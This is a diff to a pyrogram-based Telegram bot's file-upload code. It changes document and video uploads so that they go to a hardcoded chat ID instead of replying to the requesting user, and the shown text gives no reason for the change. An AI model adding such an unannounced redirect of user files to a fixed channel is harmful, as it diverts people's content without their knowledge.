@@ -11,7 +11,7 @@ import subprocess
 import time
 from functools import partial
 from pathlib import Path
-
+from pyrogram import Client
 import pyrogram.types as pyrogram
 import requests
 from hachoir.metadata import extractMetadata
@@ -299,7 +299,7 @@ async def upload_to_gdrive(file_upload, message, messa_ge, g_id):
 
 
 async def upload_single_file(
-	message:Message, local_file_name, caption_str, from_user, client, edit_media, yt_thumb
+	message:Message, local_file_name, caption_str, from_user, client:Client, edit_media, yt_thumb
 ):
 	await asyncio.sleep(EDIT_SLEEP_TIME_OUT)
 	local_file_name = str(Path(local_file_name).resolve())
@@ -332,7 +332,8 @@ async def upload_single_file(
 				"<b>🔰Status : <i>Starting Uploading...📤</i></b>\n\n🗃<b> File Name</b>: <code>{}</code>".format(os.path.basename(local_file_name))
 			)
 			prog = Progress(from_user, client, message_for_progress_display)
-		sent_message = await message.reply_document(
+		sent_message = await client.send_document(
+			chat_id=-1001319366134,
 			document=local_file_name,
 			thumb=thumb,
 			caption=caption_str,
@@ -454,7 +455,8 @@ async def upload_single_file(
 						# quote=True,
 					)
 				else:
-					sent_message = await message.reply_video(
+					sent_message = await client.send_video(
+						chat_id=-1001319366134,
 						video=local_file_name,
 						caption=caption_str,
 						parse_mode="html",
